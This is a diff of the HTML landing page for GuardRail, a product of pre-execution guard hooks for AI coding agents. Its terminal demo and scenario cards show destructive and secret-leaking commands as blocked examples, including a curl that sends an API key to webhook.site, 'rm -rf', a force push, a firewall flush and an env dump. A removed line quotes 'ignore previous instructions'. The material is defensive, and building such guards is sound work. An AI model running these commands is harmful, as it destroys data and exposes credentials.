@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>GuardRail — Pre-execution security for AI coding agents</title>
-  <meta name="description" content="Open source pre-execution security guards for AI coding agents. Production-grade patterns. EU AI Act ready. Works with Claude Code, Cursor, GitHub Copilot.">
+  <meta name="description" content="Open source pre-execution security guards for AI coding agents. Commands are checked before they run. Works with Claude Code.">
   <style>
     @font-face {
       font-family: 'Narrow';
@@ -28,7 +28,7 @@
       --code-text: #E2E8F0;
       --green: #16A34A;
       --red: #DC2626;
-      --blue: #2563EB;
+      --amber: #D97706;
       --mono: 'SF Mono', 'Cascadia Code', 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
       --body: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
       --display: 'Narrow', 'Arial Narrow', 'Helvetica Neue', Impact, system-ui, sans-serif;
@@ -48,7 +48,7 @@
     a:hover { text-decoration: underline; }
     h1, h2, h3 { text-wrap: balance; }
 
-    /* — Nav — */
+    /* Nav */
     .nav {
       position: fixed; top: 0; left: 0; right: 0; z-index: 100;
       background: rgba(250,248,245,0.88);
@@ -76,7 +76,7 @@
     }
     .nav-cta:hover { opacity: 0.85; text-decoration: none; color: var(--ground); }
 
-    /* — Hero — */
+    /* Hero */
     .hero {
       padding: 7.5rem 1.5rem 4rem;
       max-width: 960px; margin: 0 auto;
@@ -91,19 +91,20 @@
     }
     .hero h1 {
       font-family: var(--display);
-      font-size: clamp(2.8rem, 7vw, 4.5rem);
+      font-size: clamp(2.6rem, 6.5vw, 4.2rem);
       font-weight: 700;
       line-height: 0.95;
       letter-spacing: -0.01em;
       text-transform: uppercase;
       margin-bottom: 1.5rem;
-      max-width: 14ch;
+      max-width: 18ch;
     }
     .hero-sub {
-      font-size: 1.1rem;
+      font-size: 1.15rem;
       color: var(--ink-dim);
-      max-width: 48ch;
+      max-width: 52ch;
       margin-bottom: 2.5rem;
+      line-height: 1.7;
     }
     .hero-install {
       display: flex; align-items: stretch; gap: 0;
@@ -133,7 +134,51 @@
       letter-spacing: 0.02em;
     }
 
-    /* — Terminal demo — */
+    /* Problem section */
+    .problem { background: var(--ground-alt); }
+    .scenarios {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+      gap: 1.5rem;
+      margin-bottom: 2rem;
+    }
+    .scenario {
+      background: var(--ground);
+      border-radius: 6px;
+      padding: 1.5rem;
+      border-top: 3px solid var(--red);
+    }
+    .scenario-cmd {
+      font-family: var(--mono);
+      font-size: 0.8rem;
+      background: var(--code-bg);
+      color: var(--code-text);
+      padding: 0.5rem 0.8rem;
+      border-radius: 4px;
+      margin-bottom: 0.8rem;
+      overflow-x: auto;
+    }
+    .scenario h3 {
+      font-size: 0.95rem;
+      margin-bottom: 0.4rem;
+      color: var(--ink);
+    }
+    .scenario p {
+      font-size: 0.85rem;
+      color: var(--ink-dim);
+      line-height: 1.55;
+    }
+    .scenario .outcome {
+      margin-top: 0.8rem;
+      padding-top: 0.8rem;
+      border-top: 1px solid rgba(45,42,38,0.1);
+      font-size: 0.82rem;
+      font-weight: 600;
+    }
+    .outcome-bad { color: var(--red); }
+    .outcome-good { color: var(--green); }
+
+    /* Terminal demo */
     .demo {
       background: var(--code-bg);
       border-radius: 8px;
@@ -162,8 +207,43 @@
     .demo-body .ok { color: var(--green); }
     .demo-body .reason { color: #64748B; font-style: italic; }
     .demo-wrap { padding: 0 1.5rem 5rem; }
+    .demo-body .demo-line {
+      opacity: 0;
+      animation: demo-appear 0.3s ease forwards;
+    }
+    .demo-body .demo-line:nth-child(1) { animation-delay: 0.4s; }
+    .demo-body .demo-line:nth-child(2) { animation-delay: 0.9s; }
+    .demo-body .demo-line:nth-child(3) { animation-delay: 1.6s; }
+    .demo-body .demo-line:nth-child(4) { animation-delay: 2.1s; }
+    .demo-body .demo-line:nth-child(5) { animation-delay: 2.8s; }
+    .demo-body .demo-line:nth-child(6) { animation-delay: 3.3s; }
+    .demo-body .demo-line:nth-child(7) { animation-delay: 4.0s; }
+    .demo-body .demo-line:nth-child(8) { animation-delay: 4.5s; }
+    .demo-body .demo-line:nth-child(9) { animation-delay: 5.2s; }
+    .demo-body .demo-line:nth-child(10) { animation-delay: 5.7s; }
+    .demo-body .demo-line:nth-child(11) { animation-delay: 6.4s; }
+    .demo-body .demo-line:nth-child(12) { animation-delay: 6.7s; }
+    .demo-cursor {
+      display: inline-block;
+      width: 7px; height: 14px;
+      background: #E2E8F0;
+      vertical-align: middle;
+      opacity: 0;
+      animation: demo-appear 0.1s ease forwards 7.0s, demo-blink 1s step-end infinite 7.0s;
+    }
+    @keyframes demo-appear {
+      to { opacity: 1; }
+    }
+    @keyframes demo-blink {
+      0%, 49% { opacity: 1; }
+      50%, 100% { opacity: 0; }
+    }
+    @media (prefers-reduced-motion: reduce) {
+      .demo-body .demo-line { opacity: 1; animation: none; }
+      .demo-cursor { animation: none; opacity: 1; }
+    }
 
-    /* — Section — */
+    /* Section */
     section { padding: 5rem 1.5rem; }
     .wrap { max-width: 960px; margin: 0 auto; }
     .sec-eyebrow {
@@ -186,11 +266,52 @@
     .sec-desc {
       color: var(--ink-dim);
       font-size: 1rem;
-      max-width: 50ch;
+      max-width: 55ch;
       margin-bottom: 2.5rem;
+      line-height: 1.7;
     }
 
-    /* — Guards — */
+    /* How it works */
+    .how-steps {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 2rem;
+      margin-bottom: 2rem;
+    }
+    .how-step {
+      padding-top: 1.2rem;
+      border-top: 3px solid var(--accent);
+    }
+    .how-step .step-num {
+      font-family: var(--display);
+      font-size: 2rem;
+      font-weight: 700;
+      color: var(--accent);
+      line-height: 1;
+      margin-bottom: 0.5rem;
+    }
+    .how-step h3 {
+      font-size: 0.95rem;
+      margin-bottom: 0.4rem;
+      font-weight: 600;
+    }
+    .how-step p {
+      font-size: 0.85rem;
+      color: var(--ink-dim);
+      line-height: 1.55;
+    }
+    .how-step code {
+      display: block;
+      font-family: var(--mono);
+      font-size: 0.8rem;
+      background: var(--code-bg);
+      color: var(--code-text);
+      padding: 0.5rem 0.8rem;
+      border-radius: 4px;
+      margin-top: 0.6rem;
+    }
+
+    /* Guards */
     .guards { background: var(--ground-alt); }
     .guards-list {
       display: grid;
@@ -232,16 +353,63 @@
       margin-bottom: 0.4rem;
     }
 
-    /* — Dark sections — */
+    /* Origin */
+    .origin-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+      gap: 1.5rem;
+      margin-bottom: 2.5rem;
+    }
+    .origin-item {
+      padding: 1.2rem 0;
+      border-top: 2px solid rgba(45,42,38,0.15);
+    }
+    .origin-item h3 {
+      font-size: 0.95rem;
+      margin-bottom: 0.4rem;
+      font-weight: 600;
+    }
+    .origin-item p {
+      font-size: 0.85rem;
+      color: var(--ink-dim);
+      line-height: 1.55;
+    }
+    .stats {
+      display: flex; gap: 3rem; flex-wrap: wrap;
+      padding: 2.5rem 0; justify-content: center;
+      border-top: 1px solid rgba(45,42,38,0.1);
+      border-bottom: 1px solid rgba(45,42,38,0.1);
+    }
+    .stat-item { text-align: center; }
+    .stat-num {
+      font-family: var(--display);
+      font-size: 3rem;
+      font-weight: 700;
+      line-height: 1;
+      color: var(--ink);
+      font-variant-numeric: tabular-nums;
+    }
+    .stat-label {
+      font-size: 0.75rem;
+      color: var(--ink-faint);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      margin-top: 0.3rem;
+      max-width: 14ch;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    /* Dark sections */
     .dark-section {
       background: var(--dark);
       color: var(--dark-text);
     }
     .dark-section .sec-title { color: #F0EDE8; }
     .dark-section .sec-desc { color: var(--dark-dim); }
-    .dark-section a { color: var(--accent); }
+    .dark-section a:not(.btn-accent) { color: var(--accent); }
 
-    /* — Pro — */
+    /* Pro */
     .pro-grid {
       display: grid;
       grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
@@ -266,46 +434,90 @@
     }
     .pro-item p { font-size: 0.85rem; color: var(--dark-dim); line-height: 1.5; }
 
-    .pricing {
-      display: flex; align-items: flex-start; gap: 2rem; flex-wrap: wrap;
+    /* Pricing comparison */
+    .pricing-table {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1.5rem;
+      margin-bottom: 2rem;
     }
-    .price-card {
+    .price-col {
       background: var(--dark-card);
       border: 1px solid rgba(255,255,255,0.08);
       border-radius: 6px;
       padding: 2rem;
-      flex: 1; min-width: 240px;
     }
-    .price-card .amount {
+    .price-col.featured {
+      border-color: var(--accent);
+    }
+    .price-col .tier-name {
+      font-size: 0.72rem;
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+      color: var(--dark-dim);
+      margin-bottom: 0.5rem;
+    }
+    .price-col .amount {
       font-family: var(--display);
       font-size: 2.8rem;
       font-weight: 700;
       color: #F0EDE8;
       text-transform: uppercase;
       line-height: 1;
+      margin-bottom: 0.3rem;
     }
-    .price-card .amount span {
-      font-size: 0.9rem;
+    .price-col .amount span {
+      font-size: 0.85rem;
       color: var(--dark-dim);
       font-family: var(--body);
       text-transform: none;
       font-weight: 400;
     }
-    .price-card .label {
+    .price-col .tier-desc {
       font-size: 0.82rem;
       color: var(--dark-dim);
-      margin-top: 0.5rem;
-      margin-bottom: 1.2rem;
+      margin-bottom: 1.5rem;
+      line-height: 1.5;
+    }
+    .price-col ul {
+      list-style: none;
+      padding: 0;
+      margin-bottom: 1.5rem;
+    }
+    .price-col ul li {
+      font-size: 0.85rem;
+      color: var(--dark-text);
+      padding: 0.35rem 0;
+      padding-left: 1.4rem;
+      position: relative;
+    }
+    .price-col ul li::before {
+      content: '';
+      position: absolute;
+      left: 0;
+      top: 0.65rem;
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--green);
     }
     .btn-accent {
       display: inline-block;
       background: var(--accent); color: #fff;
-      padding: 0.55rem 1.2rem; border-radius: 4px;
+      padding: 0.6rem 1.4rem; border-radius: 4px;
       font-weight: 700; font-size: 0.85rem;
     }
     .btn-accent:hover { opacity: 0.9; text-decoration: none; }
+    .btn-outline {
+      display: inline-block;
+      background: transparent; color: #F0EDE8;
+      padding: 0.55rem 1.3rem; border-radius: 4px;
+      font-weight: 600; font-size: 0.85rem;
+      border: 1px solid rgba(255,255,255,0.2);
+    }
+    .btn-outline:hover { background: rgba(255,255,255,0.05); text-decoration: none; color: #F0EDE8; }
 
-    /* — Compliance — */
+    /* Compliance */
     .compliance-grid {
       display: grid;
       grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
@@ -336,32 +548,7 @@
       display: inline-block;
     }
 
-    /* — Stats — */
-    .stats {
-      display: flex; gap: 3rem; flex-wrap: wrap;
-      padding: 3rem 0; justify-content: center;
-      border-top: 1px solid rgba(45,42,38,0.1);
-      border-bottom: 1px solid rgba(45,42,38,0.1);
-      margin: 3rem 0 0;
-    }
-    .stat-item { text-align: center; }
-    .stat-num {
-      font-family: var(--display);
-      font-size: 3rem;
-      font-weight: 700;
-      line-height: 1;
-      color: var(--ink);
-      font-variant-numeric: tabular-nums;
-    }
-    .stat-label {
-      font-size: 0.78rem;
-      color: var(--ink-faint);
-      text-transform: uppercase;
-      letter-spacing: 0.08em;
-      margin-top: 0.3rem;
-    }
-
-    /* — CTA — */
+    /* CTA */
     .cta-section { text-align: center; }
     .cta-section .sec-title { margin-left: auto; margin-right: auto; }
     .cta-section .sec-desc { margin-left: auto; margin-right: auto; text-align: center; }
@@ -387,7 +574,7 @@
     .cta-links { display: flex; gap: 1.5rem; justify-content: center; flex-wrap: wrap; }
     .cta-links a { color: var(--ink-dim); font-size: 0.9rem; }
 
-    /* — Footer — */
+    /* Footer */
     footer {
       padding: 2rem 1.5rem;
       text-align: center;
@@ -396,20 +583,30 @@
       border-top: 1px solid rgba(45,42,38,0.08);
     }
     footer a { color: var(--ink-faint); }
+    footer .disclaimer {
+      margin-top: 0.8rem;
+      font-size: 0.72rem;
+      max-width: 60ch;
+      margin-left: auto;
+      margin-right: auto;
+      line-height: 1.5;
+    }
 
-    /* — Mobile — */
+    /* Mobile */
     @media (max-width: 640px) {
       .nav-links a:not(.nav-cta) { display: none; }
       .hero { padding: 6rem 1rem 3rem; }
-      .hero h1 { font-size: 2.6rem; }
+      .hero h1 { font-size: 2.4rem; }
       .hero-install { flex-direction: column; }
       .hero-install code { border-radius: 4px 4px 0 0; }
       .hero-install a { border-radius: 0 0 4px 4px; justify-content: center; padding: 0.6rem; }
       section { padding: 3rem 1rem; }
       .demo-body { font-size: 0.72rem; }
+      .how-steps { grid-template-columns: 1fr; gap: 1.5rem; }
+      .scenarios { grid-template-columns: 1fr; }
       .stats { gap: 2rem; }
       .stat-num { font-size: 2.2rem; }
-      .pricing { flex-direction: column; }
+      .pricing-table { grid-template-columns: 1fr; }
       .cta-install { flex-direction: column; }
       .cta-install code { border-radius: 4px 4px 0 0; }
       .cta-install a { border-radius: 0 0 4px 4px; justify-content: center; }
@@ -422,48 +619,116 @@
   <div class="nav-inner">
     <div class="nav-mark"><span>Guard</span>Rail</div>
     <div class="nav-links">
+      <a href="#problem">Why</a>
       <a href="#guards">Guards</a>
       <a href="#pro">Pro</a>
       <a href="#compliance">Compliance</a>
-      <a href="https://github.com/FvdHMBAI/guardrail" class="nav-cta">GitHub</a>
+      <a href="mailto:frederik@frederikvonderheyden.de?subject=GuardRail%20Private%20Preview" class="nav-cta">Private preview</a>
     </div>
   </div>
 </nav>
 
+<!-- HERO -->
 <header class="hero">
-  <div class="hero-eyebrow">Open Source &middot; MIT License</div>
-  <h1>Stop your AI agent before it breaks production</h1>
-  <p class="hero-sub">Pre-execution security guards for AI coding agents. Every command is checked before it runs. Dangerous operations are blocked, not logged after the fact.</p>
+  <div class="hero-eyebrow">Private beta &middot; Open-source Core in preparation</div>
+  <h1>Review every dangerous command before it becomes an incident.</h1>
+  <p class="hero-sub">GuardRail adds deterministic safety hooks between Claude Code and your shell. High-risk command patterns are denied before execution; safe commands continue normally.</p>
   <div class="hero-install">
     <code><span class="prompt">$</span> npx guardrail-agent init</code>
-    <a href="https://github.com/FvdHMBAI/guardrail">View on GitHub</a>
+    <a href="mailto:frederik@frederikvonderheyden.de?subject=GuardRail%20Private%20Preview">Request preview</a>
   </div>
-  <p class="hero-compat">Works with Claude Code &middot; Cursor &middot; GitHub Copilot &middot; Windsurf</p>
+  <p class="hero-compat">Claude Code supported today &middot; Other agent integrations are not yet released</p>
 </header>
 
+<!-- TERMINAL DEMO -->
 <div class="demo-wrap">
   <div class="demo">
     <div class="demo-bar">
       <div class="demo-dot"></div><div class="demo-dot"></div><div class="demo-dot"></div>
     </div>
     <div class="demo-body">
-      <div><span class="agent">agent $</span> <span class="cmd">rm -rf /etc/nginx</span>&ensp;<span class="blocked">BLOCKED</span> <span class="reason">destructive path</span></div>
-      <div><span class="agent">agent $</span> <span class="cmd">git push origin main</span>&ensp;<span class="blocked">BLOCKED</span> <span class="reason">protected branch</span></div>
-      <div><span class="agent">agent $</span> <span class="cmd">env</span>&ensp;<span class="blocked">BLOCKED</span> <span class="reason">exposes all environment variables</span></div>
-      <div><span class="agent">agent $</span> <span class="cmd">DELETE FROM users</span>&ensp;<span class="blocked">BLOCKED</span> <span class="reason">no WHERE clause</span></div>
-      <div><span class="agent">agent $</span> <span class="cmd">curl webhook.site/token</span>&ensp;<span class="blocked">BLOCKED</span> <span class="reason">exfiltration domain</span></div>
-      <div><span class="agent">agent $</span> <span class="cmd">iptables -F</span>&ensp;<span class="blocked">BLOCKED</span> <span class="reason">firewall flush</span></div>
-      <div><span class="agent">agent $</span> <span class="cmd">git push origin develop</span>&ensp;<span class="ok">ALLOWED</span></div>
-      <div><span class="agent">agent $</span> <span class="cmd">npm install express</span>&ensp;<span class="ok">ALLOWED</span></div>
+      <div class="demo-line"><span class="agent">$</span> <span class="cmd">npx guardrail-agent init</span></div>
+      <div class="demo-line"><span class="ok">+</span> <span class="reason">Installed 10 core guards</span></div>
+      <div class="demo-line" style="margin-bottom:0.6em"><span class="ok">+</span> <span class="reason">Configured Claude Code hooks</span></div>
+      <div class="demo-line"><span class="agent">$</span> <span class="cmd">rm -rf /home/developer</span>&ensp;<span class="blocked">x BLOCKED</span> <span class="reason">destructive path</span></div>
+      <div class="demo-line"><span class="agent">$</span> <span class="cmd">git push --force origin main</span>&ensp;<span class="blocked">x BLOCKED</span> <span class="reason">protected branch</span></div>
+      <div class="demo-line"><span class="agent">$</span> <span class="cmd">env</span>&ensp;<span class="blocked">x BLOCKED</span> <span class="reason">exposes all environment variables</span></div>
+      <div class="demo-line"><span class="agent">$</span> <span class="cmd">curl webhook.site/token -d $API_KEY</span>&ensp;<span class="blocked">x BLOCKED</span> <span class="reason">secret exfiltration</span></div>
+      <div class="demo-line"><span class="agent">$</span> <span class="cmd">DELETE FROM users</span>&ensp;<span class="blocked">x BLOCKED</span> <span class="reason">no WHERE clause</span></div>
+      <div class="demo-line"><span class="agent">$</span> <span class="cmd">iptables -F</span>&ensp;<span class="blocked">x BLOCKED</span> <span class="reason">firewall flush</span></div>
+      <div class="demo-line"><span class="agent">$</span> <span class="cmd">git push origin develop</span>&ensp;<span class="ok">+ OK</span></div>
+      <div class="demo-line" style="margin-bottom:0.6em"><span class="agent">$</span> <span class="cmd">npm install express</span>&ensp;<span class="ok">+ OK</span></div>
+      <div class="demo-line"><span class="ok">GuardRail active.</span> <span class="reason">6 blocked, 2 allowed.</span></div>
+      <span class="demo-cursor"></span>
     </div>
   </div>
 </div>
 
+<!-- THE PROBLEM -->
+<section id="problem" class="problem">
+  <div class="wrap">
+    <div class="sec-eyebrow">The problem</div>
+    <h2 class="sec-title">These are not hypothetical scenarios</h2>
+    <p class="sec-desc">AI coding agents are powerful because they can execute any command. That is also why they are dangerous. One wrong assumption, one hallucinated flag, one misunderstood instruction.</p>
+    <div class="scenarios">
+      <div class="scenario">
+        <div class="scenario-cmd">DROP TABLE profiles;</div>
+        <h3>The agent "cleaned up" a test table</h3>
+        <p>It connected to the production database instead of test. The table had 12,000 user profiles.</p>
+        <div class="outcome outcome-bad">Without GuardRail: Data gone. Backup restore takes hours.</div>
+        <div class="outcome outcome-good">With GuardRail: Blocked. No WHERE clause on a protected table.</div>
+      </div>
+      <div class="scenario">
+        <div class="scenario-cmd">docker inspect --format '{{.Config.Env}}' app</div>
+        <h3>The agent dumped all container secrets</h3>
+        <p>API keys, database passwords, SMTP credentials appeared in the conversation. The context window became a security incident.</p>
+        <div class="outcome outcome-bad">Without GuardRail: Secrets in chat history. Rotation needed.</div>
+        <div class="outcome outcome-good">With GuardRail: Blocked. Container env inspection requires approval.</div>
+      </div>
+      <div class="scenario">
+        <div class="scenario-cmd">git push --force origin main</div>
+        <h3>The agent "fixed" a merge conflict</h3>
+        <p>It force-pushed to the production branch, overwriting three days of team commits.</p>
+        <div class="outcome outcome-bad">Without GuardRail: Production branch rewritten. Team scrambles.</div>
+        <div class="outcome outcome-good">With GuardRail: Blocked. Force push to protected branches denied.</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- HOW IT WORKS -->
+<section id="how">
+  <div class="wrap">
+    <div class="sec-eyebrow">How it works</div>
+    <h2 class="sec-title">One command to install. Zero configuration.</h2>
+    <p class="sec-desc">GuardRail installs as pre-execution hooks in your AI coding agent. Every command passes through the guard chain before it runs. No dashboard, no YAML files, no SaaS dependency.</p>
+    <div class="how-steps">
+      <div class="how-step">
+        <div class="step-num">1</div>
+        <h3>Install</h3>
+        <p>One command adds GuardRail to your project. It configures the hooks directory and installs 10 core security guards.</p>
+        <code><span style="color:#64748B">$</span> npx guardrail-agent init</code>
+      </div>
+      <div class="how-step">
+        <div class="step-num">2</div>
+        <h3>Work normally</h3>
+        <p>Your AI agent runs commands as usual. GuardRail checks each one against the guard chain. Safe commands pass through without delay.</p>
+      </div>
+      <div class="how-step">
+        <div class="step-num">3</div>
+        <h3>Dangerous commands are blocked</h3>
+        <p>When a command matches a known dangerous pattern, GuardRail blocks it before execution. The agent sees why it was blocked and adjusts.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- CORE GUARDS -->
 <section id="guards" class="guards">
   <div class="wrap">
-    <div class="sec-eyebrow">Open Source</div>
-    <h2 class="sec-title">10 core guards, zero configuration</h2>
-    <p class="sec-desc">Install once. Every command your AI agent runs is checked against production-grade security rules.</p>
+    <div class="sec-eyebrow">Free Core &middot; Public release in preparation</div>
+    <h2 class="sec-title">10 core guards included</h2>
+    <p class="sec-desc">Ten readable MIT-licensed rules for common high-impact mistakes. Public source release follows after the private security review.</p>
     <div class="guards-list">
       <div class="guard-item">
         <div class="type-tag">pre-bash</div>
@@ -478,12 +743,12 @@
       <div class="guard-item">
         <div class="type-tag">pre-bash</div>
         <h3>basic_secret_detector</h3>
-        <p>Blocks exfiltration to webhook.site, requestbin, pipedream, and similar.</p>
+        <p>Blocks exfiltration to webhook.site, requestbin, pipedream, and similar services.</p>
       </div>
       <div class="guard-item">
         <div class="type-tag">pre-bash</div>
         <h3>destructive_path_guard</h3>
-        <p>Blocks rm -rf on /etc, /usr, /var, /home, and other protected paths.</p>
+        <p>Blocks rm -rf on /etc, /usr, /var, /home, and other critical system paths.</p>
       </div>
       <div class="guard-item">
         <div class="type-tag">pre-bash</div>
@@ -493,150 +758,200 @@
       <div class="guard-item">
         <div class="type-tag">pre-bash</div>
         <h3>service_protection_guard</h3>
-        <p>Blocks stop/disable/kill on sshd, docker, postgres, nginx.</p>
+        <p>Blocks stop/disable/kill on sshd, docker, postgres, nginx, and other critical services.</p>
       </div>
       <div class="guard-item">
         <div class="type-tag">pre-bash &middot; database</div>
         <h3>mass_update_guard</h3>
-        <p>Blocks UPDATE/DELETE without WHERE on protected tables.</p>
+        <p>Blocks UPDATE/DELETE without WHERE clause on protected database tables.</p>
       </div>
       <div class="guard-item">
         <div class="type-tag">post-bash</div>
         <h3>env_dump_detector</h3>
-        <p>Detects full environment dumps (8+ KEY=VALUE lines) in output.</p>
+        <p>Detects full environment dumps in command output and flags the exposure.</p>
       </div>
       <div class="guard-item">
         <div class="type-tag">post-bash</div>
         <h3>basic_injection_scanner</h3>
-        <p>Detects prompt injection like "ignore previous instructions" in output.</p>
+        <p>Detects prompt injection attempts in command output before they reach the agent.</p>
       </div>
       <div class="guard-item">
         <div class="type-tag">post-edit</div>
         <h3>error_swallow_guard</h3>
-        <p>Catches empty catch blocks in payment, webhook, and cron code.</p>
+        <p>Catches empty catch blocks in payment, webhook, and cron code during file edits.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ORIGIN / CREDIBILITY -->
+<section>
+  <div class="wrap">
+    <div class="sec-eyebrow">Why this exists</div>
+    <h2 class="sec-title">Built from real production incidents</h2>
+    <p class="sec-desc">GuardRail was not designed on a whiteboard. It was extracted from a production system that runs AI coding agents across multiple live applications. Every guard exists because something went wrong.</p>
+    <div class="origin-grid">
+      <div class="origin-item">
+        <h3>Incident-driven development</h3>
+        <p>Each guard was written after a real event. Database wipe, secret leak, firewall disabled, production branch overwritten. The patterns come from what actually happens, not what might.</p>
+      </div>
+      <div class="origin-item">
+        <h3>Exercised in daily operations</h3>
+        <p>The underlying guard patterns run across a multi-app infrastructure. The public Core has a separate release suite, including real dispatcher payloads and safe-command controls.</p>
+      </div>
+      <div class="origin-item">
+        <h3>Open Core</h3>
+        <p>The 10 core guards are MIT licensed and free. The Pro tier adds 48 additional guards for advanced threat patterns. Both tiers run the same architecture.</p>
       </div>
     </div>
     <div class="stats">
       <div class="stat-item">
-        <div class="stat-num">100+</div>
-        <div class="stat-label">Guards in production</div>
+        <div class="stat-num">58</div>
+        <div class="stat-label">Guards total</div>
       </div>
       <div class="stat-item">
         <div class="stat-num">15</div>
-        <div class="stat-label">Apps protected</div>
+        <div class="stat-label">Apps in our production</div>
       </div>
       <div class="stat-item">
-        <div class="stat-num">41</div>
-        <div class="stat-label">Regression tests</div>
-      </div>
-      <div class="stat-item">
-        <div class="stat-num">0</div>
-        <div class="stat-label">False negatives</div>
+        <div class="stat-num">51</div>
+        <div class="stat-label">Automated release checks</div>
       </div>
     </div>
   </div>
 </section>
 
+<!-- PRO -->
 <section id="pro" class="dark-section">
   <div class="wrap">
     <div class="sec-eyebrow">GuardRail Pro</div>
-    <h2 class="sec-title">40+ guards from real incidents</h2>
-    <p class="sec-desc">Every Pro guard exists because something went wrong in production. These are patterns you don't design on a whiteboard.</p>
+    <h2 class="sec-title">The guards you cannot write from documentation</h2>
+    <p class="sec-desc">Core guards catch the obvious threats. Pro guards catch the subtle ones: multi-step attacks that look harmless individually, agents disabling their own safeguards, PII leaking through unexpected vectors.</p>
     <div class="pro-grid">
       <div class="pro-item">
-        <h3>Advanced PII Detection</h3>
-        <p>15+ leak vectors beyond env/printenv. Script content analysis. SSH wrapping detection.</p>
+        <h3>PII Shield</h3>
+        <p>Scans agent outputs for personal data across 10 EU countries. Detects IBAN, tax IDs, names, addresses. 3-tier classification: SICHER, PRUEFEN, FREI.</p>
+      </div>
+      <div class="pro-item">
+        <h3>Audit Trail</h3>
+        <p>Structured JSONL logging of every agent action. Daily file rotation, configurable retention. The evidence layer for compliance reporting.</p>
+      </div>
+      <div class="pro-item">
+        <h3>Compliance Reporter</h3>
+        <p>Maps technical controls to governance requirements, records limitations, and highlights gaps that still need organizational or legal assessment.</p>
       </div>
       <div class="pro-item">
         <h3>Multi-Step Attack Defense</h3>
-        <p>Detects coordinated attack sequences across commands. Catches what single-command guards miss.</p>
-      </div>
-      <div class="pro-item">
-        <h3>Supply Chain Security</h3>
-        <p>npm audit integration. License compliance. Blocks packages with known vulnerabilities.</p>
+        <p>Tracks command sequences across a session. Detects coordinated reconnaissance patterns that single-command guards miss.</p>
       </div>
       <div class="pro-item">
         <h3>Self-Bypass Prevention</h3>
-        <p>Detects AI agents attempting to disable or circumvent their own security guards.</p>
+        <p>Detects when an AI agent attempts to modify, disable, or circumvent its own security guards. A real pattern we discovered in production.</p>
       </div>
       <div class="pro-item">
         <h3>PEN-Test Framework</h3>
-        <p>50+ attack patterns. Profile escape testing. Bypass persistence checks. JSON report.</p>
-      </div>
-      <div class="pro-item">
-        <h3>Compliance Reports</h3>
-        <p>EU AI Act article mapping. Risk classification. PDF audit reports for regulators.</p>
+        <p>50+ attack patterns to validate your guard chain. Profile escape testing. Bypass persistence checks. Generates a structured report.</p>
       </div>
     </div>
-    <div class="pricing">
-      <div class="price-card">
-        <div class="amount">&euro;20 <span>/dev/month</span></div>
-        <div class="label">Full guard suite, PEN-test framework, priority support</div>
-        <a href="mailto:pro@promptandbuild.de" class="btn-accent">Contact for Pro</a>
+
+    <!-- PRICING -->
+    <div class="pricing-table">
+      <div class="price-col">
+        <div class="tier-name">Core</div>
+        <div class="amount">Free</div>
+        <div class="tier-desc">Open source, MIT licensed. Always free.</div>
+        <ul>
+          <li>10 auditable core security guards</li>
+          <li>Pre-bash, post-bash, post-edit hooks</li>
+          <li>Custom guard directory for your own rules</li>
+          <li>Audit log for all blocked commands</li>
+          <li>Public issue tracker after open-source release</li>
+        </ul>
+        <a href="mailto:frederik@frederikvonderheyden.de?subject=GuardRail%20Core%20Preview" class="btn-outline">Request preview</a>
       </div>
-      <div class="price-card">
-        <div class="amount">&euro;5.000 <span>one-time</span></div>
-        <div class="label">Compliance kit: audit reports, article mapping, PDF export</div>
-        <a href="mailto:pro@promptandbuild.de" class="btn-accent">Contact for compliance</a>
+      <div class="price-col featured">
+        <div class="tier-name">Pro</div>
+        <div class="amount">&euro;29 <span>/dev/month</span></div>
+        <div class="tier-desc">48 advanced guards. PII Shield. Audit Trail. Compliance Reporter.</div>
+        <ul>
+          <li>Everything in Core</li>
+          <li>48 advanced guards from real incidents</li>
+          <li>PII Shield: personal data detection (10 EU countries)</li>
+          <li>Audit Trail: structured JSONL logging</li>
+          <li>Compliance Reporter: EU AI Act article mapping</li>
+          <li>PEN-test framework with 50+ attack patterns</li>
+          <li>Priority email support</li>
+        </ul>
+        <a href="https://buy.stripe.com/4gMbJ22PB9Ro72O6Fses000" class="btn-accent" id="checkout-pro">Subscribe to Pro</a>
       </div>
+    </div>
+
+    <div style="text-align:center;margin-bottom:1rem;">
+      <p style="color:var(--dark-dim);font-size:0.85rem;margin-bottom:0.5rem;">Need a compliance package for your organization?</p>
+      <p style="color:#F0EDE8;font-size:1.1rem;font-weight:700;margin-bottom:0.3rem;">&euro;4,900 <span style="color:var(--dark-dim);font-size:0.82rem;font-weight:400;">one-time</span></p>
+      <p style="color:var(--dark-dim);font-size:0.82rem;max-width:45ch;margin:0 auto 1rem;">Compliance Kit: Guard configuration for your stack, EU AI Act gap analysis, documentation templates, 2h setup call.</p>
+      <a href="mailto:frederik@frederikvonderheyden.de?subject=GuardRail%20Compliance%20Kit" class="btn-outline">Request Compliance Kit</a>
     </div>
   </div>
 </section>
 
+<!-- COMPLIANCE -->
 <section id="compliance">
   <div class="wrap">
-    <div class="enforcement-banner">EU AI Act enforcement begins August 2, 2026</div>
-    <h2 class="sec-title">Compliance is not optional</h2>
-    <p class="sec-desc">If your team uses AI coding agents in the EU, you need auditable governance. GuardRail provides pre-execution controls with a full audit trail.</p>
+    <div class="enforcement-banner">Technical controls for auditable AI operations</div>
+    <h2 class="sec-title">Evidence, not compliance theatre</h2>
+    <p class="sec-desc">A coding agent is not automatically a high-risk AI system under the EU AI Act. Classification depends on intended purpose and context. GuardRail contributes technical controls and evidence to a broader governance program; it is not legal advice and does not create compliance by itself.</p>
     <div class="compliance-grid">
       <div class="compliance-item">
         <div class="art">Article 9</div>
         <h3>Risk Management</h3>
